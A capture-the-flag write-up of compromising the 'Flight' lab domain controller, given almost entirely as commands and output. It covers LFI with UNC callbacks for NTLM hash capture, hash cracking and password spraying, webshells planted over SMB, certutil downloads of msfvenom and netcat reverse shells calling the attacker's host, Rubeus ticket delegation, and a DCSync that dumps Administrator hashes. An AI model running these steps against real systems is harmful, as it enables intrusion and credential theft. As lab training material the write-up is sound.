
# CTF Writeup: Flight

---
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sS -p- 10.129.228.120
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-20 16:47 -0500
Nmap scan report for 10.129.228.120
Host is up (0.017s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49686/tcp open  unknown
49694/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 107.74 seconds
```

Another more detailled scan revealed information about those services.

```
nmap -n -Pn -sSCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49686,49694 10.129.228.120
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-20 16:50 -0500
Nmap scan report for 10.129.228.120
Host is up (0.016s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-21 04:50:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-21T04:50:59
|_  start_date: N/A
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.64 seconds
```

The nmap scan reveals that the Target System seems to be an Domain Controller. The Domain "flight.htb" is exposed & also the Hostname "G0". There seems to be also an webserver running on port 80!

Let's start by mapping the discovered domain and hostname to the target ip in our local dns file.

```
echo "10.129.228.120 flight.htb G0" | tee -a /etc/hosts
```

Before checking the webpage out. Let's check if anonymous or guest authentication is enabled/available.

```
nxc smb 10.129.228.120 -u '' -p '' --shares
```

```
nxc smb 10.129.228.120 -u 'guest' -p '' --shares
```

They seem to be both unavailable.

I started with enumerating endpoints with the tools feroxbuster, dirsearch & gobuster and was able to find an interesting endpoint which revealed a lot of information about the webserver itself, but also about Absolute Server Paths & Usernames!

```
dirsearch -u http://flight.htb
```

Endpoint /cgi-bin/printenv.pl

```
COMSPEC="C:\Windows\system32\cmd.exe"
CONTEXT_DOCUMENT_ROOT="/xampp/cgi-bin/"
CONTEXT_PREFIX="/cgi-bin/"
DOCUMENT_ROOT="C:/xampp/htdocs/flight.htb"
GATEWAY_INTERFACE="CGI/1.1"
HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
HTTP_ACCEPT_ENCODING="gzip, deflate"
HTTP_ACCEPT_LANGUAGE="en-US,en;q=0.5"
HTTP_CONNECTION="keep-alive"
HTTP_HOST="flight.htb"
HTTP_PRIORITY="u=0, i"
HTTP_UPGRADE_INSECURE_REQUESTS="1"
HTTP_USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
MIBDIRS="/xampp/php/extras/mibs"
MYSQL_HOME="\xampp\mysql\bin"
OPENSSL_CONF="/xampp/apache/bin/openssl.cnf"
PATH="C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\svc_apache\AppData\Local\Microsoft\WindowsApps"
PATHEXT=".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
PHPRC="\xampp\php"
PHP_PEAR_SYSCONF_DIR="\xampp\php"
QUERY_STRING=""
REMOTE_ADDR="10.10.15.9"
REMOTE_PORT="45966"
REQUEST_METHOD="GET"
REQUEST_SCHEME="http"
REQUEST_URI="//cgi-bin/printenv.pl"
SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
SCRIPT_NAME="/cgi-bin/printenv.pl"
SERVER_ADDR="10.129.228.120"
SERVER_ADMIN="postmaster@localhost"
SERVER_NAME="flight.htb"
SERVER_PORT="80"
SERVER_PROTOCOL="HTTP/1.1"
SERVER_SIGNATURE="<address>Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at flight.htb Port 80</address>\n"
SERVER_SOFTWARE="Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1"
SYSTEMROOT="C:\Windows"
TMP="\xampp\tmp"
WINDIR="C:\Windows"

```

Proceeded with enumerating subdomains utilizing "ffuf".

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://flight.htb -H "Host: FUZZ.flight.htb" -fs 7069
```

This provided an interesting subdomain "school.flight.htb". I immediatly mapped it to the target ip in my local dns file.

```
mousepad /etc/hosts
```

Upon inspecting it, it seems to be an "Aviation School". 
The Source Code doesn't reveal a lot. But in the index.php there is an "view" parameter which is linked to an home.html. Could this subdomain be vulnerable to LFI? Let's try!

it is! I tested it by checking out the my.ini (mysql) file and it provided me credentials. 

```
http://school.flight.htb/index.php?view=C:/xampp/mysql/bin/my.ini
```

```
joe:secret
```

But spraying those credentials didn't provide us with authentication! Those could be credentials

I tried smth random and it actually worked!

I started my responder on my local machine.

```
responder -I tun0
```

And made an callback to my local machine, to potentially capture an NTLM Hash of the apache service account and I got an NTLM Hash!

```
http://school.flight.htb/index.php?view=//10.10.15.9/test
```

```
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:ceeaaa01a06cfd0b:497662F6A2FE3E293DCD53B719562FBC:010100000000000080238F626E18DD019B6646228D89128400000000020008004400570055004A0001001E00570049004E002D004400390058005900410044004F00440057003800460004003400570049004E002D004400390058005900410044004F0044005700380046002E004400570055004A002E004C004F00430041004C00030014004400570055004A002E004C004F00430041004C00050014004400570055004A002E004C004F00430041004C000700080080238F626E18DD010600040002000000080030003000000000000000000000000030000075922B2CF51F226CF0C0FBEE51492469AEF5149C65C15AE3748F887E9777E19C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0039000000000000000000
```

I stored the NTLM Hash in an svc_apache file on my local machine and successfully bruteforced an password. 

```
john svc_apache --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:05 DONE (2026-07-20 17:44) 0.1953g/s 2082Kp/s 2082Kc/s 2082KC/s SADSAM..S42150461
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

We now have an valid pair of credentials of an service account.

```
svc_apache:S@Ss!K@*t13
```

Let's use those freshly discovered credentials to enumerate all users on the target system. I stored the initial output in an "newusers.txt" file.

```
nxc smb 10.129.228.120 -u 'svc_apache' -p 'S@Ss!K@*t13' --rid-brute > newusers.txt
```

I then utilized the following command in order to format an perfect user wordlist.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

```
Administrator
Guest
krbtgt
G0$
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
WebDevs
```

Before proceeding with enumeration I decided to spray users with the retrieved password.

```
nxc smb 10.129.228.120 -u users.txt -p passwords.txt --continue-on-success
```

I found out that this password isn't only for the apache service account, but also valid for user "S.Moon".

```
S.Moon:S@Ss!K@*t13
```

Utilizing the new credentials I proceeded with enumerating SMB Shares.
There seems to 3 non-default SMB Shares available "Shared", "Users" & "Web". For we have read permissions.

```
nxc smb 10.129.228.120 -u S.Moon -p 'S@Ss!K@*t13' --shares
```

I tried to spray winrm with the svc_apache & S.Moon but we can't connect to the Domain Controller. Let's check the SMB Shares out.

The Shares don't seem to be of any use. Let's move on by enumerating LDAP using the retrieved creds.

LDAP seemed to be of no use aswell. Since I was hardstuck I had to look up for an hint and I find out that the box is bugging a bit. My scans seemed to be only telling me that we have read permissions, but on the "Shared" SMB Share we have write permissions aswell! Let's try to do an SMB Relay Attack.

I tried verifying if upload is possible by uploading an .txt file which got denied. I thought off giving up, but then I remembered that certain file extension could just be disabled. I remember my tool "ntlm_theft". 

I utilized it to generate a lot of malicious file extensions, which when we upload them onto the SMB Share should provide us with an reverse connection to our responder on our local machine.

```
python3 ntlm_theft.py -g all -s 10.10.15.9 -f important_document
```

Started responder on my local machine.

```
responder -I tun0
```
I then uploaded all of them onto the SMB Share.

The "desktop.ini" worked. After some seconds since we uploaded we immediatly retrieved the NTLM Hash of user "C.Bum". Stored it inside an C.Bum Hash and successfully bruteforced an password out of the hash file utilizing john the ripper.

```
john C.Bum --wordlist=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:08 DONE (2026-07-20 18:45) 0.1124g/s 1185Kp/s 1185Kc/s 1185KC/s TinyMutt69..Tiffani29
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

```
C.Bum:Tikkycoll_431012284
```

Before testing if we can connect as this user to the target system I will check if this password is also reused by other users. It's not!

```
nxc smb flight.htb -u users.txt -p passwords.txt --continue-on-success
```

Oddly enough we still can't connect to the target system. Let's check User C.Bum's Permissions out regarding SMB Shares!

```
nxc smb flight.htb -u C.Bum -p 'Tikkycoll_431012284' --shares
```

It seems we now have write permissions on the "Web" SMB Share. Which means we can just upload an webshell in order to get command execution or Remote Command Execution. Let's do it!

I navigated to the directory in which my wolfswebshell.php is stored and connected to the SMB Share and uploaded my webshell.

```
smbclient \\\\flight.htb/Web -U C.Bum    
Password for [WORKGROUP\C.Bum]:
Try "help" to get a list of possible commands.
smb: \> cd flight.htb\
smb: \flight.htb\> put wolfswebshell.php 
putting file wolfswebshell.php as \flight.htb\wolfswebshell.php (149.7 kB/s) (average 134.0 kB/s)
smb: \flight.htb\>
```

I now have command execution on the target server when inspecting the following domain in my browser:

```
http://flight.htb/wolfswebshell.php
```

Let's now create an malicious shell script in order to get RCE.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
```

I then started up my python3 webserver inside the directory in which my payload (shell.exe) is also stored.

```
python3 -m http.server 80
```

I transfered my payload onto the target system.

```
certutil -urlcache -split -f http://10.10.15.9/shell.exe shell.exe
```

Started up my netcat listener on my local machine.

```
rlwrap nc -lvnp 443
```

Executed the payload on my webshell.

```
shell.exe
```

Gained RCE as user "svc_apache".

```
rlwrap nc -lvnp 443                      
listening on [any] 443 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.36.165] 62585
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>
```

I decided to move on with the enumeration of the system by transfering winPEAS to the target system and running it.

```
certutil -urlcache -split -f http://10.10.15.9/winPEASx64.exe winPEAS.exe
```

I was able to enumerate an service which was previously unknown, port 8000. Trying to call this port in the browser didn't work. I'm assuming we'll need to do port forwarding. I will utilize ligolo-ng for this.

1. Setting up Ligolo on Kali:

```
sudo ip tuntap add user saitama mode tun ligolo
```

```
sudo ip link set ligolo up
```

2. Start the proxy.

```
ligolo-proxy -selfcert
```

On Target Server

3. Transfered proxy agent to the target server.

```
certutil -urlcache -split -f http://10.10.15.9/agent.exe agent.exe
```

4. Target connect back to local machine.

```
agent.exe -connect 10.10.15.9:11601 -ignore-cert
```

5. In Proxy Interface

```
session
start --tun ligolo
```
 
 6. Then, add the magic Ligolo IP to the IP route table on Kali since we’re trying to access a localhost port.

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

Now, we should be able to access any local port by using the magic IP 240.0.0.1.

I inspected the service running on 8000 and it seems to be another webserver.

```
http://240.0.0.1:8000/
```

Enumerating endpoints using gobuster didn't provide much besides some standard directories.

Since my shell can't be touched anymore due to the ligolo agent. I need to get another one. I connected to the SMB Share again and uploaded my wolfswebshell.php this time into the other domain directory school.flight.htb.

```
smbclient \\\\flight.htb/Web -U C.Bum
Password for [WORKGROUP\C.Bum]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 15:52:01 2026
  ..                                  D        0  Tue Jul 21 15:52:01 2026
  flight.htb                          D        0  Tue Jul 21 15:52:00 2026
  school.flight.htb                   D        0  Tue Jul 21 15:52:01 2026

                5056511 blocks of size 4096. 1210965 blocks available
smb: \> cd school.flight.htb\
smb: \school.flight.htb\> ls
  .                                   D        0  Tue Jul 21 15:52:01 2026
  ..                                  D        0  Tue Jul 21 15:52:01 2026
  about.html                          A     1689  Mon Oct 24 22:54:45 2022
  blog.html                           A     3618  Mon Oct 24 22:53:59 2022
  home.html                           A     2683  Mon Oct 24 22:56:58 2022
  images                              D        0  Tue Jul 21 15:52:01 2026
  index.php                           A     2092  Thu Oct 27 02:59:25 2022
  lfi.html                            A      179  Thu Oct 27 02:55:16 2022
  styles                              D        0  Tue Jul 21 15:52:01 2026

                5056511 blocks of size 4096. 1210965 blocks available
smb: \school.flight.htb\> put wolfswebshell.php
```

Downloaded nc.exe onto the target system.

```
certutil -urlcache -split -f http://10.10.15.9/nc.exe nc.exe
```

I then started another netcat listener on port 993.

```
rlwrap nc -lvnp 993
```

Executed the following command on the webshell.

```
nc.exe 10.10.15.9 993 -e cmd.exe
```

Gained RCE again.

Observing the Root again and we can see another directory "inetpub" which probably represents the webserver running on port 8000. There is an interesting directory which represents the Web-Root "development". If we have write permissions to that we can potentially get an elevated shell. 

```
icacls C:\inetpub\development
```

The user C.Bum which we already owned has write permissions for this directory!
Since we got credentials for user C.Bum, let's try to utilize Runas.exe to potentially perform lateral movement.

```
certutil -urlcache -split -f http://10.10.15.9/RunasCs.exe Runas.exe
```

I will utilize nc.exe to get RCE as user C.Bum! Started up netcat listener on port 88.

```
rlwrap nc -lvnp 88
```

Executed the following command on the target system.

```
Runas.exe C.Bum Tikkycoll_431012284 "C:\Temp\nc.exe 10.10.15.9 88 -e cmd.exe"
```

Gained RCE as user "C.Bum".

```
rlwrap nc -lvnp 88     
listening on [any] 88 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.36.165] 51202
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved user.txt in C:\Users\C.Bum\Desktop.

```
13b9daa777d0ef9b755b6d7de125be97
```
## Privilege Escalation

Enumerating his privileges didn't reveal anything useful to escalate to Administrator. Let's try & put an wolfswebshell inside the development directory and call it, to see which user is behind!

Navigated to C:\inetpub\development and executed the following command in order to download an wolfswebshell into the webroot for the webserver running on port 8000.

```
certutil -urlcache -split -f http://10.10.15.9/wolfswebshell.php wolfswebshell.php
```

It seems to be ASP.net, so we'll need to upload an .aspx reverse shell!

I will utilize the following webshell for this:

```
https://github.com/Y3llowDuck/nic3r/blob/main/nic3r1.aspx
```

Downloaded the webshell onto the C:\inetpub\development\development.

```
certutil -urlcache -split -f http://10.10.15.9/nic3r1.aspx webshell.aspx
```

Accessed the webshell

```
http://240.0.0.1:8000/development/webshell.aspx
```

Gained Command Execution as iis apppool\defaultapppool user.

I decided to start another netcat listener on port 55.

```
rlwrap nc -lvnp 55
```

Executed the following command in order to get RCE.

```
C:\Temp\nc.exe 10.10.15.9 55 -e cmd.exe
```

Enumerated privileges of current user.

```
whoami /all
```

The user has the "SeImpersonatePrivilege" enabled! Let's try & abuse it with PrintSpoofer & SweetPotato.exe. Tried both, but both didn't work.

Since this account can talk to the domain and uses the domain controller’s machine account to do so, getting this account’s Kerberos Ticket (TGT) will allow us to perform a DCSync. Rubeus lets us acquire the TGT easily.

Transfered "Rubeus" onto target system.

```
certutil -urlcache -split -f http://10.10.15.9/Rubeus.exe Rubeus.exe
```

Ran it to gain Ticket

```
Rubeus.exe tgtdeleg /nowrap
```

Save Output in ticket.kirbi.base64

---
## DCSync Attack

Decode the ticket.

```
cat ticket.kirbi.base64| base64 -d ticket.kirbi
```

Convert it to the format needed by my Linux System:

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

export it Kerberos Variable

```
export KRB5CCNAME=ticket.ccache 
```

Trying to Dump Domain Hashes out of memory.

```
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
```

Clock skew error??

```
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up...
```

Connected to target system.

```
impacket-psexec Administrator@g0.flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
dcb23f70c821107fab1e72a4ecc51088
```